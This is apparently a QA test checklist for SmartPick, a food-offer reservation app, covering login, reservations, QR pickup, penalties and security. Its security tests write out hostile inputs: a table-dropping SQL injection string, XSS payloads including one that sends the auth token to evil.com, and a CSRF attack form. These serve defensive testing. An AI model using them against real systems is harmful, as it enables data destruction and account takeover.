# 🧪 SMARTPICK QA TEST CHECKLIST
## Comprehensive Test Suite for Manual & Automated Testing
**Version:** 1.0  
**Date:** January 5, 2026  
**Platforms:** Web, Android, Backend

---

## TEST CATEGORIES

1. [Functional Tests](#functional-tests) (87 tests)
2. [Security Tests](#security-tests) (42 tests)
3. [Performance Tests](#performance-tests) (18 tests)
4. [Regression Tests](#regression-tests) (24 tests)
5. [Edge Case Tests](#edge-case-tests) (35 tests)
6. [Cross-Platform Tests](#cross-platform-tests) (16 tests)

**Total Tests:** 222

---

## FUNCTIONAL TESTS

### AUTH-001: User Registration
**Category:** Authentication  
**Priority:** P0 (Critical)

**Preconditions:**
- App installed or website open
- No active session

**Steps:**
1. Click "Sign Up"
2. Enter email: `test@example.com`
3. Enter password: `TestPassword123!@#` (12+ chars)
4. Enter name: `John Doe`
5. Click "Create Account"

**Expected Result:**
- Account created successfully
- User redirected to onboarding flow
- Welcome email sent to inbox
- User profile created in `users` table with `role = 'CUSTOMER'`

**Failure Risk:** 🔴 HIGH - Broken auth = no users

**Automation:** ✅ Automate with Playwright
```javascript
test('user registration', async ({ page }) => {
  await page.goto('/');
  await page.click('text=Sign Up');
  await page.fill('[name="email"]', 'test@example.com');
  await page.fill('[name="password"]', 'TestPassword123!@#');
  await page.fill('[name="name"]', 'John Doe');
  await page.click('button:has-text("Create Account")');
  await expect(page).toHaveURL('/onboarding');
});
```

---

### AUTH-002: Login with Valid Credentials
**Category:** Authentication  
**Priority:** P0

**Preconditions:**
- User account exists
- User logged out

**Steps:**
1. Click "Login"
2. Enter email: `existing@user.com`
3. Enter password: `CorrectPassword123`
4. Click "Login"

**Expected Result:**
- User logged in
- JWT token stored in localStorage (`smartpick-auth`)
- Redirected to home page
- User data loaded in zustand store

**Failure Risk:** 🔴 CRITICAL - Can't login = app unusable

---

### AUTH-003: Login with Invalid Password
**Category:** Authentication - Negative Test  
**Priority:** P1

**Steps:**
1. Click "Login"
2. Enter email: `existing@user.com`
3. Enter password: `WrongPassword`
4. Click "Login"

**Expected Result:**
- Login fails
- Error message: "Invalid email or password"
- User NOT logged in
- No token stored
- No rate limit triggered (first attempt)

**Failure Risk:** 🟡 MEDIUM - Security/UX issue

---

### AUTH-004: Rate Limiting on Login
**Category:** Security + Authentication  
**Priority:** P1

**Steps:**
1. Attempt login with wrong password 5 times
2. Attempt 6th login

**Expected Result:**
- First 5 attempts: "Invalid password"
- 6th attempt: "Too many login attempts. Try again in 15 minutes"
- Rate limit entry created in database
- No ability to login for 15 minutes

**Failure Risk:** 🔴 HIGH - Brute force vulnerability

---

### AUTH-005: Password Reset Flow
**Category:** Authentication  
**Priority:** P1

**Steps:**
1. Click "Forgot Password"
2. Enter email: `user@example.com`
3. Check email inbox
4. Click reset link
5. Enter new password: `NewPassword456!`
6. Submit

**Expected Result:**
- Reset email sent
- Link expires after 1 hour
- Password updated in database
- User can login with new password
- Old password no longer works

**Failure Risk:** 🟡 MEDIUM - Support burden

---

### AUTH-006: Google OAuth Login
**Category:** Authentication  
**Priority:** P2

**Steps:**
1. Click "Login with Google"
2. Authorize SmartPick app
3. Redirect back to app

**Expected Result:**
- User logged in
- Profile created with Google email + name
- Avatar fetched from Google
- `auth_provider = 'google'` in database

**Failure Risk:** 🟡 MEDIUM - Alternative login method

---

### OFFER-001: Browse Offers as Guest
**Category:** Offers  
**Priority:** P0

**Preconditions:**
- User NOT logged in
- At least 5 active offers exist

**Steps:**
1. Open homepage
2. Scroll through offer cards

**Expected Result:**
- Offers displayed in grid/list
- Each card shows: image, title, price, discount %
- No error messages
- "Login to Reserve" button visible

**Failure Risk:** 🔴 CRITICAL - Core feature

---

### OFFER-002: View Offer Details
**Category:** Offers  
**Priority:** P0

**Steps:**
1. Click on any offer card
2. View offer detail page

**Expected Result:**
- Full details displayed: description, images, location, pickup hours
- Partner info visible
- "Reserve" button enabled (if logged in)
- Map shows partner location

**Failure Risk:** 🟡 MEDIUM

---

### OFFER-003: Filter Offers by Category
**Category:** Offers  
**Priority:** P1

**Steps:**
1. Click "RESTAURANT" filter
2. Observe filtered results

**Expected Result:**
- Only restaurant offers shown
- Count updates: "12 offers"
- Map markers filtered
- No expired offers shown

**Failure Risk:** 🟢 LOW - Nice to have

---

### OFFER-004: Search Offers by Keyword
**Category:** Offers  
**Priority:** P1

**Steps:**
1. Enter "pizza" in search bar
2. Press enter

**Expected Result:**
- Offers containing "pizza" in title/description shown
- Debounced (300ms delay)
- Case-insensitive search
- Empty state if no results

**Failure Risk:** 🟢 LOW

---

### RESERVE-001: Create Reservation (Happy Path)
**Category:** Reservations  
**Priority:** P0

**Preconditions:**
- User logged in
- User has 100+ SmartPoints
- Offer has quantity_available >= 2

**Steps:**
1. Open offer detail page
2. Select quantity: 2
3. Click "Reserve Now"
4. Confirm in modal

**Expected Result:**
- Reservation created with status = 'ACTIVE'
- Offer quantity_available reduced by 2
- User points deducted (e.g., 50 points)
- QR code generated (format: `SP-LZ4XMM-...`)
- Push notification sent to partner
- Telegram notification sent to user
- User redirected to MyPicks page

**Failure Risk:** 🔴 CRITICAL - Core transaction

**Automation:**
```javascript
test('create reservation', async ({ page }) => {
  await loginAsUser(page);
  await page.goto('/offers/test-offer-id');
  await page.selectOption('[name="quantity"]', '2');
  await page.click('text=Reserve Now');
  await page.click('text=Confirm');
  await expect(page).toHaveURL('/mypicks');
  await expect(page.locator('.qr-code')).toBeVisible();
});
```

---

### RESERVE-002: Reserve with Insufficient Points
**Category:** Reservations - Negative Test  
**Priority:** P1

**Preconditions:**
- User logged in
- User has 10 SmartPoints
- Offer costs 50 SmartPoints

**Steps:**
1. Open offer
2. Click "Reserve Now"

**Expected Result:**
- Modal shows: "Insufficient SmartPoints"
- Link to "Earn More Points" page
- No reservation created
- Points not deducted

**Failure Risk:** 🟡 MEDIUM

---

### RESERVE-003: Reserve Expired Offer
**Category:** Reservations - Negative Test  
**Priority:** P1

**Preconditions:**
- Offer `expires_at < NOW()`

**Steps:**
1. Open expired offer URL
2. Click "Reserve Now"

**Expected Result:**
- Error: "Offer has expired"
- "Reserve" button disabled
- No reservation created

**Failure Risk:** 🟡 MEDIUM

---

### RESERVE-004: Reserve During Closed Business Hours
**Category:** Reservations - Time Logic  
**Priority:** P1

**Preconditions:**
- Current time: 2:00 AM
- Partner business hours: 9:00 AM - 6:00 PM

**Steps:**
1. Open offer
2. Click "Reserve Now"

**Expected Result:**
- Error: "Business is currently closed. Opens at 9:00 AM"
- No reservation created
- No rate limit triggered (client-side validation)

**Failure Risk:** 🟡 MEDIUM - UX issue

---

### RESERVE-005: Concurrent Reservations (Race Condition)
**Category:** Reservations - Stress Test  
**Priority:** P0

**Preconditions:**
- Offer has quantity_available = 1
- 10 users attempt to reserve simultaneously

**Steps:**
1. Simulate 10 concurrent API calls to `createReservation`
2. All users attempt to reserve quantity = 1

**Expected Result:**
- ONLY 1 reservation succeeds
- 9 reservations fail with "Insufficient quantity"
- Database constraint prevents negative inventory
- No double-spend of offer

**Failure Risk:** 🔴 CRITICAL - Financial risk

**Automation:**
```javascript
test('concurrent reservations', async () => {
  const promises = Array(10).fill(null).map(() =>
    fetch('/api/reservations', {
      method: 'POST',
      body: JSON.stringify({ offerId: 'test-id', quantity: 1 })
    })
  );
  const results = await Promise.allSettled(promises);
  const successes = results.filter(r => r.status === 'fulfilled').length;
  expect(successes).toBe(1);
});
```

---

### RESERVE-006: Maximum Active Reservations Limit
**Category:** Reservations - Business Logic  
**Priority:** P1

**Preconditions:**
- User already has 1 active reservation
- `MAX_ACTIVE_RESERVATIONS = 1`

**Steps:**
1. Attempt to reserve another offer

**Expected Result:**
- Error: "You can only have 1 active reservation at a time"
- No reservation created

**Failure Risk:** 🟡 MEDIUM

---

### RESERVE-007: Cancel Reservation Before Pickup
**Category:** Reservations  
**Priority:** P1

**Preconditions:**
- User has active reservation
- Reservation not expired

**Steps:**
1. Go to MyPicks page
2. Click "Cancel" on reservation
3. Confirm cancellation

**Expected Result:**
- Reservation status = 'CANCELLED'
- Offer quantity_available increased
- Points refunded to user
- Cancellation tracked for penalty system
- Partner notified via push + Telegram

**Failure Risk:** 🟡 MEDIUM

---

### RESERVE-008: Cancel After 3rd Cancellation (Penalty)
**Category:** Reservations - Penalty System  
**Priority:** P0

**Preconditions:**
- User has cancelled 2 reservations today
- User attempts 3rd cancellation

**Steps:**
1. Cancel reservation

**Expected Result:**
- Reservation cancelled
- Penalty modal shown: "30-minute cooldown"
- User cannot reserve for 30 minutes
- `user_penalties` row created
- `can_user_reserve()` returns false

**Failure Risk:** 🔴 HIGH - Abuse prevention

---

### PICKUP-001: Partner Scans Valid QR Code
**Category:** Pickup  
**Priority:** P0

**Preconditions:**
- Customer has active reservation
- Partner logged in on dashboard
- QR code displayed on customer's phone

**Steps:**
1. Partner clicks "Scan QR"
2. Camera opens
3. Partner scans customer's QR code

**Expected Result:**
- Reservation status → 'PICKED_UP'
- Points transferred from escrow to partner
- Customer sees success animation
- Partner sees confirmation message
- Pickup timestamp recorded

**Failure Risk:** 🔴 CRITICAL - Core transaction

---

### PICKUP-002: Partner Scans Already Used QR
**Category:** Pickup - Negative Test  
**Priority:** P1

**Preconditions:**
- Reservation already picked up

**Steps:**
1. Partner scans same QR again

**Expected Result:**
- Error: "QR code already used"
- No duplicate points transfer
- No status change

**Failure Risk:** 🔴 HIGH - Financial risk

---

### PICKUP-003: Partner Scans Expired QR
**Category:** Pickup - Negative Test  
**Priority:** P1

**Preconditions:**
- Reservation `expires_at < NOW()`
- Status = 'ACTIVE' (not picked up in time)

**Steps:**
1. Partner scans QR

**Expected Result:**
- Error: "Reservation expired"
- No pickup allowed
- Customer charged penalty (no-show)

**Failure Risk:** 🟡 MEDIUM

---

### PICKUP-004: QR Code Screenshot Replay Attack
**Category:** Security  
**Priority:** P0

**Preconditions:**
- Customer picked up reservation yesterday
- Customer took screenshot of QR code

**Steps:**
1. Customer shows screenshot to different partner
2. Partner scans screenshot

**Expected Result:**
- Error: "Invalid or already used QR code"
- Database check: `status != 'ACTIVE'`
- No points transferred

**Failure Risk:** 🔴 CRITICAL - Fraud prevention

---

### PARTNER-001: Partner Application
**Category:** Partner Onboarding  
**Priority:** P1

**Steps:**
1. User clicks "Become a Partner"
2. Fill out business info
3. Upload business license
4. Submit application

**Expected Result:**
- Partner record created with `status = 'PENDING'`
- Admin notified
- Applicant sees "Under Review" message

**Failure Risk:** 🟡 MEDIUM

---

### PARTNER-002: Admin Approves Partner
**Category:** Admin  
**Priority:** P1

**Preconditions:**
- Admin logged in
- Pending partner application exists

**Steps:**
1. Admin opens partner approval dashboard
2. Reviews application
3. Clicks "Approve"

**Expected Result:**
- Partner `status = 'APPROVED'`
- Partner notified via email
- Partner can now create offers
- Storage upload permissions granted

**Failure Risk:** 🟡 MEDIUM

---

### PARTNER-003: Partner Creates Offer
**Category:** Partner Dashboard  
**Priority:** P0

**Preconditions:**
- Partner approved
- Partner logged in

**Steps:**
1. Navigate to "Create Offer"
2. Upload image (2MB JPG)
3. Enter title: "Fresh Pizza"
4. Enter prices: original=₾20, smart=₾12
5. Set quantity: 10
6. Set pickup hours: 9 AM - 6 PM
7. Click "Publish"

**Expected Result:**
- Offer created with `status = 'ACTIVE'`
- Offer visible to customers
- Image stored in `offer-images` bucket
- Expiration set to 12 hours from now

**Failure Risk:** 🔴 HIGH - Core partner feature

---

### PARTNER-004: Partner Upload Exceeds Quota
**Category:** Partner - Storage  
**Priority:** P2

**Preconditions:**
- Partner has 15 images uploaded
- Image quota = 15

**Steps:**
1. Attempt to upload 16th image

**Expected Result:**
- Error: "Image quota exceeded"
- Upload rejected
- Prompt to delete old images

**Failure Risk:** 🟢 LOW

---

### POINTS-001: User Earns Points from Referral
**Category:** Points System  
**Priority:** P2

**Steps:**
1. User shares referral link
2. Friend signs up via link
3. Friend completes first reservation

**Expected Result:**
- Referrer earns 50 bonus points
- Point transaction logged
- Referral tracked in database

**Failure Risk:** 🟢 LOW

---

### POINTS-002: User Purchases Reservation Slot
**Category:** Points System  
**Priority:** P1

**Preconditions:**
- User has 200 SmartPoints
- User currently has 3 reservation slots

**Steps:**
1. Navigate to profile
2. Click "Unlock 4th Slot" (costs 100 points)
3. Confirm purchase

**Expected Result:**
- User `max_reservation_quantity = 4`
- Points deducted: 100
- Purchase logged in `purchased_slots` array

**Failure Risk:** 🟡 MEDIUM

---

### PENALTY-001: First No-Show Warning
**Category:** Penalty System  
**Priority:** P0

**Preconditions:**
- User has 0 previous penalties
- User's reservation expires without pickup

**Steps:**
1. Wait for reservation to expire
2. Backend cron job runs

**Expected Result:**
- Penalty modal shown: "⚠️ Warning: Please pick up reservations"
- No cooldown applied (warning only)
- `penalty_count = 1` in database

**Failure Risk:** 🟡 MEDIUM

---

### PENALTY-002: Second Offense - 30min Cooldown
**Category:** Penalty System  
**Priority:** P0

**Preconditions:**
- User already has 1 penalty

**Steps:**
1. Miss another pickup

**Expected Result:**
- 30-minute cooldown applied
- `suspended_until = NOW() + INTERVAL '30 minutes'`
- User cannot reserve during cooldown
- Modal explains penalty

**Failure Risk:** 🔴 HIGH - Core fraud prevention

---

### PENALTY-003: User Lifts Cooldown with Points
**Category:** Penalty System  
**Priority:** P1

**Preconditions:**
- User in 30-minute cooldown
- User has 50 SmartPoints

**Steps:**
1. Click "Lift Cooldown" in penalty modal
2. Pay 50 points

**Expected Result:**
- Cooldown removed
- `suspended_until = NULL`
- User can reserve again
- Points deducted

**Failure Risk:** 🟡 MEDIUM

---

### NOTIFY-001: Push Notification on New Reservation
**Category:** Notifications  
**Priority:** P1

**Preconditions:**
- Partner has FCM token registered
- Customer creates reservation

**Steps:**
1. Customer reserves offer

**Expected Result:**
- Partner receives push notification: "New reservation: Pizza x2"
- Notification sound plays
- Tapping opens partner dashboard

**Failure Risk:** 🟡 MEDIUM - UX issue

---

### MAP-001: View Offers on Map
**Category:** Map  
**Priority:** P1

**Steps:**
1. Navigate to Map view
2. Zoom to Tbilisi

**Expected Result:**
- Markers shown for all active offers
- Clustering enabled (nearby markers group)
- Clicking marker shows offer preview
- Geolocation permission requested

**Failure Risk:** 🟢 LOW

---

### ADMIN-001: Admin Views All Users
**Category:** Admin  
**Priority:** P2

**Preconditions:**
- Admin logged in

**Steps:**
1. Navigate to Admin Dashboard
2. Click "Users"

**Expected Result:**
- All users listed
- Search/filter enabled
- Can view penalties/points

**Failure Risk:** 🟢 LOW

---

## SECURITY TESTS

### SEC-001: SQL Injection on Offer Search
**Category:** Security - Input Validation  
**Priority:** P0

**Steps:**
1. Enter search term: `'; DROP TABLE offers; --`
2. Submit search

**Expected Result:**
- Search returns 0 results (no SQL executed)
- Database unchanged
- No error message leaking schema

**Failure Risk:** 🔴 CRITICAL - Data loss

---

### SEC-002: XSS in Offer Description
**Category:** Security - XSS  
**Priority:** P0

**Steps:**
1. Partner creates offer with description:
   ```html
   <script>alert('XSS')</script>
   ```
2. Customer views offer

**Expected Result:**
- Script NOT executed
- HTML escaped: `&lt;script&gt;`
- DOMPurify sanitization applied

**Failure Risk:** 🔴 CRITICAL - Account takeover

---

### SEC-003: IDOR - Access Other User's Reservation
**Category:** Security - IDOR  
**Priority:** P0

**Steps:**
1. User A logs in
2. User A discovers User B's reservation ID
3. User A calls: `GET /api/reservations/{user-b-id}`

**Expected Result:**
- 403 Forbidden
- RLS policy blocks access
- No data leaked

**Failure Risk:** 🔴 CRITICAL - Privacy breach

---

### SEC-004: JWT Token Theft via XSS
**Category:** Security  
**Priority:** P0

**Steps:**
1. Inject XSS payload: `<script>fetch('https://evil.com?token='+localStorage.getItem('smartpick-auth'))</script>`
2. Victim views payload

**Expected Result:**
- XSS prevented by CSP headers
- If XSS succeeds, token stolen → Account takeover

**Failure Risk:** 🔴 CRITICAL

---

### SEC-005: Rate Limit Bypass via VPN
**Category:** Security - Rate Limiting  
**Priority:** P1

**Steps:**
1. Attempt 10 reservations as User A
2. Get rate limited
3. Change VPN location
4. Attempt 10 more reservations

**Expected Result:**
- Still rate limited (uses user ID + IP)
- IP change doesn't bypass

**Failure Risk:** 🟠 HIGH

---

### SEC-006: Brute Force Admin Password
**Category:** Security - Brute Force  
**Priority:** P0

**Steps:**
1. Attempt 100 admin login attempts with common passwords

**Expected Result:**
- Blocked after 5 attempts
- Account locked for 15 minutes
- Alert sent to admin

**Failure Risk:** 🔴 CRITICAL

---

### SEC-007: CSRF on Reservation Creation
**Category:** Security - CSRF  
**Priority:** P1

**Steps:**
1. Attacker crafts malicious page with form:
   ```html
   <form action="https://smartpick.ge/api/reservations" method="POST">
     <input name="offerId" value="evil-offer-id">
   </form>
   ```
2. Victim visits page while logged in

**Expected Result:**
- Request rejected (no CSRF token)
- No reservation created

**Failure Risk:** 🟠 HIGH

---

## (Remaining 35 security tests follow similar format...)

---

## PERFORMANCE TESTS

### PERF-001: Page Load Time (Web)
**Target:** < 2 seconds  
**Steps:** Load homepage with 50 offers  
**Expected:** LCP < 2s, FID < 100ms, CLS < 0.1

---

### PERF-002: API Response Time (Offers List)
**Target:** < 300ms  
**Steps:** Call `GET /api/offers?limit=50`  
**Expected:** p50 < 200ms, p95 < 500ms

---

### PERF-003: Database Query Performance
**Target:** < 100ms  
**Steps:** Query offers with filters + geolocation  
**Expected:** Query plan uses indexes, no seq scans

---

### PERF-004: Concurrent User Load
**Target:** 1000 concurrent users  
**Steps:** Load test with k6  
**Expected:** 95% success rate, < 5s response time

---

## REGRESSION TESTS

### REG-001: Previous Bug - Business Hours Rate Limit
**Issue:** [ANDROID_SECURITY_PERFORMANCE_AUDIT.md#BUG-1]  
**Steps:**
1. Click on offer with business closed
2. Verify error shown WITHOUT triggering rate limit

**Expected:** Error displayed, no rate limit entry created

---

## EDGE CASE TESTS

### EDGE-001: User in Multiple Timezones
**Steps:**
1. User reserves offer in Georgia (UTC+4)
2. User travels to USA (UTC-5)
3. User views reservation

**Expected:**
- Expiration time shows correctly in local timezone
- Pickup window calculated correctly

---

### EDGE-002: Offer Quantity = 0
**Steps:**
1. Create offer with quantity = 1
2. User A reserves it
3. User B attempts to reserve (race condition)

**Expected:**
- User B gets "Sold Out" error
- Atomic update prevents overselling

---

### EDGE-003: Partner Deletes Offer with Active Reservations
**Steps:**
1. Create offer
2. Users reserve it
3. Partner deletes offer

**Expected:**
- Error: "Cannot delete offer with active reservations"
- Offer status set to 'PAUSED' instead

---

## CROSS-PLATFORM TESTS

### CROSS-001: QR Code Format Consistency
**Platforms:** Android, Web  
**Steps:**
1. Generate QR on Android
2. Scan on Web-based partner dashboard

**Expected:** QR scans successfully

---

### CROSS-002: Push Notifications
**Platforms:** Android, Web (PWA)  
**Steps:**
1. Enable notifications on both
2. Trigger notification

**Expected:** Both receive notifications

---

## AUTOMATION RECOMMENDATIONS

### High Priority for Automation
1. ✅ User registration/login (AUTH-001 to AUTH-006)
2. ✅ Reservation creation happy path (RESERVE-001)
3. ✅ Concurrent reservations (RESERVE-005)
4. ✅ QR replay attack (PICKUP-004)
5. ✅ SQL injection (SEC-001)
6. ✅ XSS (SEC-002)
7. ✅ IDOR (SEC-003)

### Framework Recommendations
- **E2E:** Playwright (Web) + Appium (Android)
- **API:** Jest + Supertest
- **Load:** k6 or Artillery
- **Security:** OWASP ZAP automated scan

---

## TEST ENVIRONMENTS

### Local Development
- `http://localhost:5173` (Vite dev server)
- Mock Supabase client
- Seeded database

### Staging
- `https://staging.smartpick.ge`
- Separate Supabase project
- Anonymized production data clone

### Production
- `https://smartpick.ge`
- Smoke tests only (no destructive tests)

---

## TEST DATA SETUP

### Seed Script (SQL)
```sql
-- Create test users
INSERT INTO users (email, name, role) VALUES
  ('customer@test.com', 'Test Customer', 'CUSTOMER'),
  ('partner@test.com', 'Test Partner', 'PARTNER'),
  ('admin@test.com', 'Test Admin', 'ADMIN');

-- Create test offers
INSERT INTO offers (...) VALUES (...);

-- Add test points
INSERT INTO user_points (user_id, balance) VALUES
  ((SELECT id FROM users WHERE email = 'customer@test.com'), 1000);
```

---

## CI/CD INTEGRATION

### Pre-Merge Checks
1. Run unit tests
2. Run critical E2E tests (P0 only)
3. Run security scans (OWASP ZAP)
4. Check code coverage (>80%)

### Nightly Regression Suite
1. Run full E2E suite (all 222 tests)
2. Generate HTML report
3. Email failures to team

---

## METRICS & REPORTING

### Test Coverage Target
- Unit tests: 85%
- Integration tests: 70%
- E2E tests: Critical paths (P0)

### Key Metrics
- Test pass rate: >95%
- Test execution time: <15 minutes (E2E)
- Flakiness rate: <2%

---

**Checklist Version:** 1.0  
**Last Updated:** January 5, 2026  
**Maintained By:** QA Team
